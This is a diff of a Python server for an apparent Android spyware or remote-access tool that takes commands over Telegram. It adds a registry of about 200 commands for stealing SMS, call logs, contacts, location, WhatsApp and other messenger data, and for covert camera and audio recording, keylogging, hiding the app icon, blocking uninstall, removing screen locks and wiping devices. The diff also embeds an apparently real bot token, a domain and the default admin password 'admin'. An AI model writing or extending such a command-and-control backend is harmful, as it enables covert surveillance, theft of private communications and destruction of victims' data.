@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-أبو زهرة - خادم البوت الشامل
-Complete Telegram Bot Server with Web Dashboard, getUpdates polling,
-REST API, session management, and 100+ commands.
+Abu-Zahra Server - Complete Telegram Bot with Web Dashboard
+200+ commands, REST API, getUpdates polling, professional web dashboard.
+Uses ONLY aiohttp - no other dependencies besides Python stdlib.
 """
 
 import asyncio
@@ -18,18 +18,19 @@ import traceback
 from datetime import datetime, timezone, timedelta
 from pathlib import Path
 from urllib.parse import urlparse, parse_qs
-from io import StringIO
+from collections import OrderedDict
 
 import aiohttp
 from aiohttp import web
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Configuration
-# ═══════════════════════════════════════════════════════════════════════════════
+# ============================================================================
+# CONFIGURATION
+# ============================================================================
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "7344776596"))
 SERVER_PORT = int(os.environ.get("SERVER_PORT", "8443"))
+SERVER_DOMAIN = os.environ.get("SERVER_DOMAIN", "https://alsydyabwalzhra.online")
 SESSION_SECRET = os.environ.get("SESSION_SECRET", "abu-zahra-secret-key-2025")
 DATA_DIR = Path(__file__).parent / "data"
 
@@ -38,6 +39,7 @@ SESSIONS_FILE = DATA_DIR / "sessions.json"
 COMMANDS_FILE = DATA_DIR / "commands.json"
 EVENTS_FILE = DATA_DIR / "events.json"
 SETTINGS_FILE = DATA_DIR / "settings.json"
+LINK_CODES_FILE = DATA_DIR / "link_codes.json"
 
 logging.basicConfig(
     level=logging.INFO,
@@ -46,9 +48,9 @@ logging.basicConfig(
 )
 log = logging.getLogger("abu-zahra")
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Global State
-# ═══════════════════════════════════════════════════════════════════════════════
+# ============================================================================
+# GLOBAL STATE
+# ============================================================================
 
 START_TIME = time.time()
 messages_sent = 0
@@ -58,9 +60,201 @@ _tg_session = None
 polling_active = False
 server_settings = {}
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Data Helpers
-# ═══════════════════════════════════════════════════════════════════════════════
+# ============================================================================
+# 200+ COMMAND REGISTRY - organized by category
+# ============================================================================
+
+COMMAND_REGISTRY = {
+    # Data Collection (20)
+    "sms":              {"cat": "data",    "cmd": "get_sms",              "desc": "📲 جلب الرسائل SMS",            "emoji": "📲"},
+    "calls":            {"cat": "data",    "cmd": "get_calls",            "desc": "📞 جلب سجل المكالمات",          "emoji": "📞"},
+    "contacts":         {"cat": "data",    "cmd": "get_contacts",         "desc": "📇 جلب جهات الاتصال",            "emoji": "📇"},
+    "location":         {"cat": "data",    "cmd": "get_location",         "desc": "📍 جلب الموقع الجغرافي",        "emoji": "📍"},
+    "notifications":    {"cat": "data",    "cmd": "get_notifications",    "desc": "🔔 جلب الإشعارات",              "emoji": "🔔"},
+    "apps":             {"cat": "data",    "cmd": "get_apps",             "desc": "📱 جلب التطبيقات المثبتة",      "emoji": "📱"},
+    "info":             {"cat": "data",    "cmd": "get_info",             "desc": "ℹ️ معلومات الجهاز",             "emoji": "ℹ️"},
+    "battery":          {"cat": "data",    "cmd": "get_battery",          "desc": "🔋 حالة البطارية",              "emoji": "🔋"},
+    "gallery":          {"cat": "data",    "cmd": "get_gallery",          "desc": "🖼️ المعرض",                     "emoji": "🖼️"},
+    "clipboard":        {"cat": "data",    "cmd": "get_clipboard",        "desc": "📋 الحافظة",                    "emoji": "📋"},
+    "all_data":         {"cat": "data",    "cmd": "get_all_data",         "desc": "📥 جميع البيانات",               "emoji": "📥"},
+    "wifi_info":        {"cat": "data",    "cmd": "get_wifi_info",        "desc": "📶 معلومات الواي فاي",          "emoji": "📶"},
+    "bluetooth_devices":{"cat": "data",    "cmd": "get_bluetooth",        "desc": "🔵 أجهزة البلوتوث",             "emoji": "🔵"},
+    "network_info":     {"cat": "data",    "cmd": "get_network_info",     "desc": "🌐 معلومات الشبكة",             "emoji": "🌐"},
+    "sim_info":         {"cat": "data",    "cmd": "get_sim_info",         "desc": "📱 معلومات الشريحة",            "emoji": "📱"},
+    "storage_info":     {"cat": "data",    "cmd": "get_storage_info",     "desc": "💾 معلومات التخزين",            "emoji": "💾"},
+    "installed_apps":   {"cat": "data",    "cmd": "get_installed_apps",   "desc": "📦 التطبيقات المثبتة",          "emoji": "📦"},
+    "running_apps":     {"cat": "data",    "cmd": "get_running_apps",     "desc": "⚡ التطبيقات النشطة",           "emoji": "⚡"},
+    "calendar":         {"cat": "data",    "cmd": "get_calendar",         "desc": "📅 التقويم",                    "emoji": "📅"},
+    "browser_history":  {"cat": "data",    "cmd": "get_browser_history",  "desc": "🌍 سجل المتصفح",               "emoji": "🌍"},
+
+    # Social Media (15)
+    "whatsapp":         {"cat": "social",  "cmd": "get_whatsapp",         "desc": "💬 واتساب",                     "emoji": "💬"},
+    "telegram_app":     {"cat": "social",  "cmd": "get_telegram",         "desc": "✈️ تليجرام",                    "emoji": "✈️"},
+    "instagram":        {"cat": "social",  "cmd": "get_instagram",        "desc": "📷 انستجرام",                   "emoji": "📷"},
+    "messenger":        {"cat": "social",  "cmd": "get_messenger",        "desc": "📘 ماسنجر",                     "emoji": "📘"},
+    "snapchat":         {"cat": "social",  "cmd": "get_snapchat",         "desc": "👻 سناب شات",                   "emoji": "👻"},
+    "tiktok":           {"cat": "social",  "cmd": "get_tiktok",           "desc": "🎵 تيك توك",                    "emoji": "🎵"},
+    "twitter":          {"cat": "social",  "cmd": "get_twitter",          "desc": "🐦 تويتر / X",                  "emoji": "🐦"},
+    "viber":            {"cat": "social",  "cmd": "get_viber",            "desc": "💜 فايبر",                      "emoji": "💜"},
+    "signal":           {"cat": "social",  "cmd": "get_signal",           "desc": "🟢 سيجنال",                     "emoji": "🟢"},
+    "facebook":         {"cat": "social",  "cmd": "get_facebook",         "desc": "📘 فيسبوك",                     "emoji": "📘"},
+    "whatsapp_status":  {"cat": "social",  "cmd": "get_whatsapp_status",  "desc": "📝 حالات واتساب",              "emoji": "📝"},
+    "whatsapp_stories": {"cat": "social",  "cmd": "get_whatsapp_stories", "desc": "📖 قصص واتساب",                "emoji": "📖"},
+    "telegram_channels":{"cat": "social",  "cmd": "get_telegram_channels","desc": "📺 قنوات تليجرام",             "emoji": "📺"},
+    "instagram_stories":{"cat": "social",  "cmd": "get_instagram_stories","desc": "📸 قصص انستجرام",              "emoji": "📸"},
+    "youtube":          {"cat": "social",  "cmd": "get_youtube",          "desc": "▶️ يوتيوب",                     "emoji": "▶️"},
+
+    # Remote Control (40)
+    "ping":             {"cat": "control", "cmd": "ping",                 "desc": "📡 فحص الاتصال",               "emoji": "📡"},
+    "vibrate":          {"cat": "control", "cmd": "vibrate",              "desc": "📳 اهتزاز",                     "emoji": "📳"},
+    "ring":             {"cat": "control", "cmd": "ring",                 "desc": "🔔 رنين",                      "emoji": "🔔"},
+    "screenshot":       {"cat": "control", "cmd": "screenshot",           "desc": "📸 لقطة شاشة",                 "emoji": "📸"},
+    "front_camera":     {"cat": "control", "cmd": "front_camera",         "desc": "📷 كاميرا أمامية",             "emoji": "📷"},
+    "back_camera":      {"cat": "control", "cmd": "back_camera",          "desc": "📷 كاميرا خلفية",              "emoji": "📷"},
+    "record_audio":     {"cat": "control", "cmd": "record_audio",         "desc": "🎙️ تسجيل صوتي",               "emoji": "🎙️"},
+    "record_video":     {"cat": "control", "cmd": "record_video",         "desc": "🎬 تسجيل فيديو",               "emoji": "🎬"},
+    "lock_phone":       {"cat": "control", "cmd": "lock_phone",           "desc": "🔒 قفل الهاتف",                "emoji": "🔒"},
+    "unlock_phone":     {"cat": "control", "cmd": "unlock_phone",         "desc": "🔓 فتح الهاتف",                "emoji": "🔓"},
+    "reboot":           {"cat": "control", "cmd": "reboot",               "desc": "🔄 إعادة تشغيل",              "emoji": "🔄"},
+    "shutdown":         {"cat": "control", "cmd": "shutdown",             "desc": "⏻ إيقاف التشغيل",             "emoji": "⏻"},
+    "set_volume":       {"cat": "control", "cmd": "set_volume",           "desc": "🔊 تعيين الصوت",               "emoji": "🔊"},
+    "set_brightness":   {"cat": "control", "cmd": "set_brightness",       "desc": "☀️ تعيين السطوع",              "emoji": "☀️"},
+    "set_ringtone":     {"cat": "control", "cmd": "set_ringtone",         "desc": "🔔 تعيين النغمة",               "emoji": "🔔"},
+    "set_wallpaper":    {"cat": "control", "cmd": "set_wallpaper",        "desc": "🖼️ تعيين الخلفية",             "emoji": "🖼️"},
+    "enable_wifi":      {"cat": "control", "cmd": "enable_wifi",          "desc": "📶 تشغيل الواي فاي",           "emoji": "📶"},
+    "disable_wifi":     {"cat": "control", "cmd": "disable_wifi",         "desc": "📵 إيقاف الواي فاي",           "emoji": "📵"},
+    "enable_bluetooth": {"cat": "control", "cmd": "enable_bluetooth",     "desc": "🔵 تشغيل البلوتوث",            "emoji": "🔵"},
+    "disable_bluetooth":{"cat": "control", "cmd": "disable_bluetooth",    "desc": "❌ إيقاف البلوتوث",            "emoji": "❌"},
+    "enable_mobile_data":{"cat": "control","cmd": "enable_mobile_data",   "desc": "📶 تشغيل بيانات الجوال",       "emoji": "📶"},
+    "disable_mobile_data":{"cat":"control","cmd": "disable_mobile_data",  "desc": "📵 إيقاف بيانات الجوال",       "emoji": "📵"},
+    "enable_hotspot":   {"cat": "control", "cmd": "enable_hotspot",       "desc": "📡 تشغيل نقطة الاتصال",        "emoji": "📡"},
+    "disable_hotspot":  {"cat": "control", "cmd": "disable_hotspot",      "desc": "📵 إيقاف نقطة الاتصال",        "emoji": "📵"},
+    "airplane_on":      {"cat": "control", "cmd": "airplane_on",          "desc": "✈️ وضع الطيران - تشغيل",      "emoji": "✈️"},
+    "airplane_off":     {"cat": "control", "cmd": "airplane_off",         "desc": "📱 وضع الطيران - إيقاف",      "emoji": "📱"},
+    "auto_rotate_on":   {"cat": "control", "cmd": "auto_rotate_on",       "desc": "🔄 الدوران التلقائي - تشغيل", "emoji": "🔄"},
+    "auto_rotate_off":  {"cat": "control", "cmd": "auto_rotate_off",      "desc": "🔒 الدوران التلقائي - إيقاف", "emoji": "🔒"},
+    "torch_on":         {"cat": "control", "cmd": "torch_on",             "desc": "🔦 تشغيل الكشاف",              "emoji": "🔦"},
+    "torch_off":        {"cat": "control", "cmd": "torch_off",            "desc": "🔦 إطفاء الكشاف",              "emoji": "🔦"},
+    "play_sound":       {"cat": "control", "cmd": "play_sound",           "desc": "🔊 تشغيل صوت",                "emoji": "🔊"},
+    "speak_text":       {"cat": "control", "cmd": "speak_text",           "desc": "🗣️ نطق نص",                   "emoji": "🗣️"},
+    "show_notification":{"cat": "control", "cmd": "show_notification",    "desc": "🔔 إظهار إشعار",              "emoji": "🔔"},
+    "open_url":         {"cat": "control", "cmd": "open_url",             "desc": "🌐 فتح رابط",                  "emoji": "🌐"},
+    "send_sms":         {"cat": "control", "cmd": "send_sms",             "desc": "📲 إرسال رسالة SMS",           "emoji": "📲"},
+    "make_call":        {"cat": "control", "cmd": "make_call",            "desc": "📞 إجراء مكالمة",              "emoji": "📞"},
+    "block_number":     {"cat": "control", "cmd": "block_number",         "desc": "🚫 حظر رقم",                  "emoji": "🚫"},
+    "unblock_number":   {"cat": "control", "cmd": "unblock_number",       "desc": "✅ إلغاء حظر رقم",             "emoji": "✅"},
+
+    # App Management (20)
+    "open_app":         {"cat": "apps",    "cmd": "open_app",             "desc": "📱 فتح تطبيق",                 "emoji": "📱"},
+    "close_app":        {"cat": "apps",    "cmd": "close_app",            "desc": "❌ إغلاق تطبيق",               "emoji": "❌"},
+    "install_app":      {"cat": "apps",    "cmd": "install_app",          "desc": "📥 تثبيت تطبيق",               "emoji": "📥"},
+    "uninstall_app":    {"cat": "apps",    "cmd": "uninstall_app",        "desc": "🗑️ حذف تطبيق",                "emoji": "🗑️"},
+    "block_app":        {"cat": "apps",    "cmd": "block_app",            "desc": "🚫 حظر تطبيق",                "emoji": "🚫"},
+    "unblock_app":      {"cat": "apps",    "cmd": "unblock_app",          "desc": "✅ إلغاء حظر تطبيق",           "emoji": "✅"},
+    "clear_app_data":   {"cat": "apps",    "cmd": "clear_app_data",       "desc": "🧹 مسح بيانات تطبيق",         "emoji": "🧹"},
+    "force_stop_app":   {"cat": "apps",    "cmd": "force_stop_app",       "desc": "⛔ إيقاف قسري",               "emoji": "⛔"},
+    "app_info":         {"cat": "apps",    "cmd": "app_info",             "desc": "ℹ️ معلومات تطبيق",            "emoji": "ℹ️"},
+    "app_usage":        {"cat": "apps",    "cmd": "app_usage",            "desc": "📊 استخدام التطبيقات",        "emoji": "📊"},
+    "screen_time":      {"cat": "apps",    "cmd": "screen_time",          "desc": "⏱️ وقت الشاشة",               "emoji": "⏱️"},
+    "app_permissions":  {"cat": "apps",    "cmd": "app_permissions",      "desc": "🔐 صلاحيات التطبيق",          "emoji": "🔐"},
+    "enable_app":       {"cat": "apps",    "cmd": "enable_app",           "desc": "✅ تفعيل تطبيق",              "emoji": "✅"},
+    "disable_app":      {"cat": "apps",    "cmd": "disable_app",          "desc": "❌ تعطيل تطبيق",              "emoji": "❌"},
+    "list_blocked":     {"cat": "apps",    "cmd": "list_blocked",         "desc": "📋 قائمة التطبيقات المحظورة",  "emoji": "📋"},
+    "clear_cache":      {"cat": "apps",    "cmd": "clear_cache",          "desc": "🧹 مسح الكاش",                "emoji": "🧹"},
+    "update_app":       {"cat": "apps",    "cmd": "update_app",           "desc": "⬆️ تحديث تطبيق",              "emoji": "⬆️"},
+    "launch_app":       {"cat": "apps",    "cmd": "launch_app",           "desc": "🚀 تشغيل تطبيق",              "emoji": "🚀"},
+    "kill_app":         {"cat": "apps",    "cmd": "kill_app",             "desc": "💀 إنهاء تطبيق",               "emoji": "💀"},
+    "app_cache":        {"cat": "apps",    "cmd": "app_cache",            "desc": "💾 كاش التطبيقات",             "emoji": "💾"},
+
+    # File Management (25)
+    "list_files":       {"cat": "files",   "cmd": "list_files",           "desc": "📂 عرض الملفات",               "emoji": "📂"},
+    "get_file":         {"cat": "files",   "cmd": "get_file",             "desc": "📄 جلب ملف",                  "emoji": "📄"},
+    "download_file":    {"cat": "files",   "cmd": "download_file",        "desc": "⬇️ تحميل ملف",                "emoji": "⬇️"},
+    "list_downloads":   {"cat": "files",   "cmd": "list_downloads",       "desc": "📥 مجلد التحميلات",            "emoji": "📥"},
+    "list_dcim":        {"cat": "files",   "cmd": "list_dcim",            "desc": "📸 مجلد DCIM",                "emoji": "📸"},
+    "list_music":       {"cat": "files",   "cmd": "list_music",           "desc": "🎵 مجلد الموسيقى",            "emoji": "🎵"},
+    "list_videos":      {"cat": "files",   "cmd": "list_videos",          "desc": "🎬 مجلد الفيديوهات",          "emoji": "🎬"},
+    "list_documents":   {"cat": "files",   "cmd": "list_documents",       "desc": "📁 مجلد المستندات",            "emoji": "📁"},
+    "list_whatsapp":    {"cat": "files",   "cmd": "list_whatsapp_files",  "desc": "💬 ملفات واتساب",             "emoji": "💬"},
+    "list_telegram_files":{"cat":"files",  "cmd": "list_telegram_files",  "desc": "✈️ ملفات تليجرام",            "emoji": "✈️"},
+    "send_contacts_backup":{"cat":"files", "cmd": "send_contacts_backup", "desc": "📇 نسخة جهات الاتصال",          "emoji": "📇"},
+    "send_sms_backup":  {"cat": "files",   "cmd": "send_sms_backup",      "desc": "📲 نسخة الرسائل",              "emoji": "📲"},
+    "send_calls_backup":{"cat": "files",   "cmd": "send_calls_backup",    "desc": "📞 نسخة المكالمات",            "emoji": "📞"},
+    "send_whatsapp_backup":{"cat":"files", "cmd": "send_whatsapp_backup", "desc": "💬 نسخة واتساب",               "emoji": "💬"},
+    "send_full_backup": {"cat": "files",   "cmd": "send_full_backup",     "desc": "💾 نسخة احتياطية كاملة",       "emoji": "💾"},
+    "delete_file":      {"cat": "files",   "cmd": "delete_file",          "desc": "🗑️ حذف ملف",                  "emoji": "🗑️"},
+    "rename_file":      {"cat": "files",   "cmd": "rename_file",          "desc": "✏️ إعادة تسمية ملف",          "emoji": "✏️"},
+    "copy_file":        {"cat": "files",   "cmd": "copy_file",            "desc": "📋 نسخ ملف",                  "emoji": "📋"},
+    "move_file":        {"cat": "files",   "cmd": "move_file",            "desc": "📦 نقل ملف",                  "emoji": "📦"},
+    "create_folder":    {"cat": "files",   "cmd": "create_folder",        "desc": "📁 إنشاء مجلد",               "emoji": "📁"},
+    "get_folder_size":  {"cat": "files",   "cmd": "get_folder_size",      "desc": "📏 حجم المجلد",               "emoji": "📏"},
+    "search_files":     {"cat": "files",   "cmd": "search_files",         "desc": "🔍 بحث في الملفات",           "emoji": "🔍"},
+    "recent_files":     {"cat": "files",   "cmd": "recent_files",         "desc": "🕐 الملفات الأخيرة",           "emoji": "🕐"},
+    "file_info":        {"cat": "files",   "cmd": "file_info",            "desc": "ℹ️ معلومات ملف",              "emoji": "ℹ️"},
+    "zip_files":        {"cat": "files",   "cmd": "zip_files",            "desc": "📦 ضغط ملفات",                "emoji": "📦"},
+
+    # Security & Admin (15)
+    "wipe_data":        {"cat": "security","cmd": "wipe_data",            "desc": "💣 مسح البيانات",              "emoji": "💣"},
+    "factory_reset":    {"cat": "security","cmd": "factory_reset",        "desc": "⚠️ إعادة ضبط المصنع",         "emoji": "⚠️"},
+    "show_app":         {"cat": "security","cmd": "show_app",             "desc": "👁️ إظهار أيقونة التطبيق",     "emoji": "👁️"},
+    "hide_app":         {"cat": "security","cmd": "hide_app",             "desc": "🙈 إخفاء أيقونة التطبيق",     "emoji": "🙈"},
+    "change_passcode":  {"cat": "security","cmd": "change_passcode",      "desc": "🔑 تغيير رمز القفل",          "emoji": "🔑"},
+    "set_pin":          {"cat": "security","cmd": "set_pin",              "desc": "🔢 تعيين رقم PIN",             "emoji": "🔢"},
+    "remove_pin":       {"cat": "security","cmd": "remove_pin",           "desc": "🔓 إزالة رقم PIN",             "emoji": "🔓"},
+    "enable_biometric": {"cat": "security","cmd": "enable_biometric",     "desc": "👤 تشغيل البصمة",             "emoji": "👤"},
+    "disable_biometric":{"cat": "security","cmd": "disable_biometric",    "desc": "❌ إيقاف البصمة",             "emoji": "❌"},
+    "anti_uninstall_on":{"cat": "security","cmd": "anti_uninstall_on",    "desc": "🛡️ الحماية من الحذف - تشغيل", "emoji": "🛡️"},
+    "anti_uninstall_off":{"cat":"security","cmd": "anti_uninstall_off",   "desc": "⛔ الحماية من الحذف - إيقاف", "emoji": "⛔"},
+    "device_admin_status":{"cat":"security","cmd":"device_admin_status",  "desc": "📋 حالة مسؤول الجهاز",        "emoji": "📋"},
+    "check_root":       {"cat": "security","cmd": "check_root",           "desc": "🧪 فحص الروت",                "emoji": "🧪"},
+    "set_screen_lock":  {"cat": "security","cmd": "set_screen_lock",      "desc": "🔒 تعيين قفل الشاشة",         "emoji": "🔒"},
+    "remove_screen_lock":{"cat":"security","cmd":"remove_screen_lock",    "desc": "🔓 إزالة قفل الشاشة",         "emoji": "🔓"},
+
+    # Monitoring (20)
+    "keylogger_start":  {"cat": "monitor", "cmd": "keylogger_start",      "desc": "⌨️ بدء تسجيل المفاتيح",        "emoji": "⌨️"},
+    "keylogger_stop":   {"cat": "monitor", "cmd": "keylogger_stop",       "desc": "⏹️ إيقاف تسجيل المفاتيح",     "emoji": "⏹️"},
+    "get_keylogger":    {"cat": "monitor", "cmd": "get_keylogger",        "desc": "📥 جلب بيانات لوحة المفاتيح",   "emoji": "📥"},
+    "screen_record_start":{"cat":"monitor","cmd":"screen_record_start",   "desc": "🔴 بدء تسجيل الشاشة",         "emoji": "🔴"},
+    "screen_record_stop":{"cat": "monitor","cmd": "screen_record_stop",   "desc": "⏹️ إيقاف تسجيل الشاشة",       "emoji": "⏹️"},
+    "clipboard_monitor_start":{"cat":"monitor","cmd":"clipboard_monitor_start","desc":"📋 بدء مراقبة الحافظة","emoji":"📋"},
+    "clipboard_monitor_stop":{"cat":"monitor","cmd":"clipboard_monitor_stop","desc":"⏹️ إيقاف مراقبة الحافظة","emoji":"⏹️"},
+    "get_clipboard_log":{"cat": "monitor", "cmd": "get_clipboard_log",    "desc": "📋 سجل الحافظة",               "emoji": "📋"},
+    "wifi_monitor_start":{"cat": "monitor", "cmd": "wifi_monitor_start",  "desc": "📡 بدء مراقبة الواي فاي",     "emoji": "📡"},
+    "wifi_monitor_stop":{"cat": "monitor", "cmd": "wifi_monitor_stop",   "desc": "⏹️ إيقاف مراقبة الواي فاي",   "emoji": "⏹️"},
+    "app_monitor_start":{"cat": "monitor", "cmd": "app_monitor_start",    "desc": "📱 بدء مراقبة التطبيقات",      "emoji": "📱"},
+    "app_monitor_stop": {"cat": "monitor", "cmd": "app_monitor_stop",     "desc": "⏹️ إيقاف مراقبة التطبيقات",   "emoji": "⏹️"},
+    "get_app_log":      {"cat": "monitor", "cmd": "get_app_log",          "desc": "📋 سجل التطبيقات",             "emoji": "📋"},
+    "location_live":    {"cat": "monitor", "cmd": "location_live",        "desc": "🗺️ تتبع مباشر",               "emoji": "🗺️"},
+    "location_stop":    {"cat": "monitor", "cmd": "location_stop",        "desc": "⏹️ إيقاف التتبع",             "emoji": "⏹️"},
+    "location_history": {"cat": "monitor", "cmd": "location_history",     "desc": "📜 سجل المواقع",              "emoji": "📜"},
+    "geo_add":          {"cat": "monitor", "cmd": "geo_add",              "desc": "➕ إضافة منطقة جغرافية",       "emoji": "➕"},
+    "geo_remove":       {"cat": "monitor", "cmd": "geo_remove",           "desc": "➖ حذف منطقة جغرافية",         "emoji": "➖"},
+    "geo_list":         {"cat": "monitor", "cmd": "geo_list",             "desc": "📋 قائمة المناطق الجغرافية",   "emoji": "📋"},
+    "sms_monitor":      {"cat": "monitor", "cmd": "sms_monitor",          "desc": "📲 مراقبة الرسائل",            "emoji": "📲"},
+    "call_monitor":     {"cat": "monitor", "cmd": "call_monitor",         "desc": "📞 مراقبة المكالمات",          "emoji": "📞"},
+
+    # System Settings (15)
+    "set_language":     {"cat": "syssettings", "cmd": "set_language",     "desc": "🌐 تعيين اللغة",               "emoji": "🌐"},
+    "set_timezone":     {"cat": "syssettings", "cmd": "set_timezone",     "desc": "🕐 تعيين المنطقة الزمنية",     "emoji": "🕐"},
+    "set_alarm":        {"cat": "syssettings", "cmd": "set_alarm",        "desc": "⏰ تعيين منبه",                "emoji": "⏰"},
+    "set_timer":        {"cat": "syssettings", "cmd": "set_timer",        "desc": "⏱️ تعيين مؤقت",               "emoji": "⏱️"},
+    "set_reminder":     {"cat": "syssettings", "cmd": "set_reminder",     "desc": "📝 تعيين تذكير",              "emoji": "📝"},
+    "enable_dev_mode":  {"cat": "syssettings", "cmd": "enable_dev_mode",  "desc": "🔧 تشغيل وضع المطور",         "emoji": "🔧"},
+    "disable_dev_mode": {"cat": "syssettings", "cmd": "disable_dev_mode", "desc": "❌ إيقاف وضع المطور",         "emoji": "❌"},
+    "enable_usb_debug": {"cat": "syssettings", "cmd": "enable_usb_debug", "desc": "🔌 تشغيل تصحيح USB",          "emoji": "🔌"},
+    "disable_usb_debug":{"cat": "syssettings", "cmd": "disable_usb_debug","desc": "❌ إيقاف تصحيح USB",          "emoji": "❌"},
+    "dns_change":       {"cat": "syssettings", "cmd": "dns_change",       "desc": "🌐 تغيير DNS",               "emoji": "🌐"},
+    "proxy_set":        {"cat": "syssettings", "cmd": "proxy_set",        "desc": "🔀 تعيين بروكسي",             "emoji": "🔀"},
+    "apn_settings":     {"cat": "syssettings", "cmd": "apn_settings",     "desc": "📶 إعدادات APN",             "emoji": "📶"},
+    "nfc_on":           {"cat": "syssettings", "cmd": "nfc_on",           "desc": "📡 تشغيل NFC",               "emoji": "📡"},
+    "nfc_off":          {"cat": "syssettings", "cmd": "nfc_off",          "desc": "❌ إيقاف NFC",               "emoji": "❌"},
+    "auto_update_on":   {"cat": "syssettings", "cmd": "auto_update_on",   "desc": "⬆️ التحديث التلقائي - تشغيل", "emoji": "⬆️"},
+    "auto_update_off":  {"cat": "syssettings", "cmd": "auto_update_off",  "desc": "⏸️ التحديث التلقائي - إيقاف", "emoji": "⏸️"},
+}
+
+# ============================================================================
+# DATA HELPERS
+# ============================================================================
 
 def ensure_data_dir():
     DATA_DIR.mkdir(parents=True, exist_ok=True)
@@ -70,6 +264,7 @@ def ensure_data_dir():
         COMMANDS_FILE: [],
         EVENTS_FILE: [],
         SETTINGS_FILE: {
+            "admin_password": "admin",
             "sync_interval": 300,
             "location_interval": 60,
             "auto_location": True,
@@ -81,24 +276,30 @@ def ensure_data_dir():
             "wifi_monitor": False,
             "geofences": [],
         },
+        LINK_CODES_FILE: [],
     }
     for fpath, default in defaults.items():
         if not fpath.exists():
             fpath.write_text(json.dumps(default, ensure_ascii=False, indent=2))
 
 
-def load_json(path: Path, default=None):
+def load_json(path, default=None):
     try:
-        return json.loads(path.read_text())
-    except Exception:
-        return default if default is not None else []
+        if path.exists():
+            return json.loads(path.read_text())
+    except Exception as exc:
+        log.error("Failed to load %s: %s", path, exc)
+    return default if default is not None else []
 
 
-def save_json(path: Path, data):
-    path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
+def save_json(path, data):
+    try:
+        path.write_text(json.dumps(data, ensure_ascii=False, indent=2))
+    except Exception as exc:
+        log.error("Failed to save %s: %s", path, exc)
 
 
-def append_event(event: str, details: dict = None, level: str = "info"):
+def append_event(event, details=None, level="info"):
     events = load_json(EVENTS_FILE, [])
     events.append({
         "time": datetime.now(timezone.utc).isoformat(),
@@ -106,14 +307,14 @@ def append_event(event: str, details: dict = None, level: str = "info"):
         "details": details or {},
         "level": level,
     })
-    if len(events) > 1000:
-        events = events[-1000:]
+    if len(events) > 2000:
+        events = events[-2000:]
     save_json(EVENTS_FILE, events)
-    log.info("[EVENT] %s | %s", event, details or "")
 
 
-def load_settings() -> dict:
+def load_settings():
     return load_json(SETTINGS_FILE, {
+        "admin_password": "admin",
         "sync_interval": 300,
         "location_interval": 60,
         "auto_location": True,
@@ -127,7 +328,7 @@ def load_settings() -> dict:
     })
 
 
-def save_settings(settings: dict):
+def save_settings_data(settings):
     save_json(SETTINGS_FILE, settings)
 
 
@@ -135,29 +336,25 @@ def ts():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 
-def uptime():
+def get_uptime():
     return int(time.time() - START_TIME)
 
 
 def format_uptime(seconds):
-    days = seconds // 86400
-    hours = (seconds % 86400) // 3600
-    minutes = (seconds % 3600) // 60
-    secs = seconds % 60
+    d = seconds // 86400
+    h = (seconds % 86400) // 3600
+    m = (seconds % 3600) // 60
+    s = seconds % 60
     parts = []
-    if days:
-        parts.append(f"{days} يوم")
-    if hours:
-        parts.append(f"{hours} ساعة")
-    if minutes:
-        parts.append(f"{minutes} دقيقة")
-    parts.append(f"{secs} ثانية")
-    return "، ".join(parts)
+    if d: parts.append(f"{d}d")
+    if h: parts.append(f"{h}h")
+    if m: parts.append(f"{m}m")
+    parts.append(f"{s}s")
+    return " ".join(parts)
 
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# Device Helpers
-# ═══════════════════════════════════════════════════════════════════════════════
+# ============================================================================
+# DEVICE HELPERS
+# ============================================================================
 
 def get_devices():
     return load_json(DEVICES_FILE, [])
@@ -168,14 +365,13 @@ def save_devices(devices):
 
 
 def find_device(device_id):
-    devices = get_devices()
-    for d in devices:
+    for d in get_devices():
         if d.get("id") == device_id:
             return d
     return None
 
 
-def update_device(device_id, updates: dict):
+def update_device(device_id, updates):
     devices = get_devices()
     for i, d in enumerate(devices):
         if d.get("id") == device_id:
@@ -187,7 +383,7 @@ def update_device(device_id, updates: dict):
     return None
 
 
-def add_device(device_data: dict):
+def add_device(device_data):
     devices = get_devices()
     for i, d in enumerate(devices):
         if d.get("id") == device_data.get("id"):
@@ -199,7 +395,7 @@ def add_device(device_data: dict):
     device_data["created_at"] = ts()
     devices.append(device_data)
     save_devices(devices)
-    append_event("تسجيل جهاز جديد", {"id": device_data["id"], "name": device_data.get("name", "")})
+    append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
     return device_data
 
 
@@ -209,7 +405,7 @@ def remove_device(device_id):
     if len(new_devices) == len(devices):
         return False
     save_devices(new_devices)
-    append_event("حذف جهاز", {"id": device_id})
+    append_event("Device removed", {"id": device_id})
     return True
 
 
@@ -217,12 +413,11 @@ def get_first_device():
     devices = get_devices()
     return devices[0] if devices else None
 
+# ============================================================================
+# COMMAND QUEUE HELPERS
+# ============================================================================
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Command Queue Helpers
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def queue_command(device_id: str, command: str, params: dict = None):
+def queue_command(device_id, command, params=None):
     commands = load_json(COMMANDS_FILE, [])
     cmd = {
         "id": str(uuid.uuid4())[:8],
@@ -235,96 +430,136 @@ def queue_command(device_id: str, command: str, params: dict = None):
         "result": None,
     }
     commands.append(cmd)
-    if len(commands) > 500:
-        commands = commands[-500:]
+    if len(commands) > 1000:
+        commands = commands[-1000:]
     save_json(COMMANDS_FILE, commands)
-    append_event("أمر جديد في الطابور", {"device_id": device_id, "command": command})
+    append_event("Command queued", {"device_id": device_id, "command": command, "cmd_id": cmd["id"]})
     return cmd
 
 
-def get_pending_commands(device_id: str):
+def get_pending_commands(device_id):
     commands = load_json(COMMANDS_FILE, [])
     return [c for c in commands if c.get("device_id") == device_id and c.get("status") == "pending"]
 
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Session Helpers
-# ═══════════════════════════════════════════════════════════════════════════════
+def update_command_status(cmd_id, status, result=None):
+    commands = load_json(COMMANDS_FILE, [])
+    for i, c in enumerate(commands):
+        if c.get("id") == cmd_id:
+            commands[i]["status"] = status
+            commands[i]["result"] = result
+            commands[i]["completed_at"] = ts()
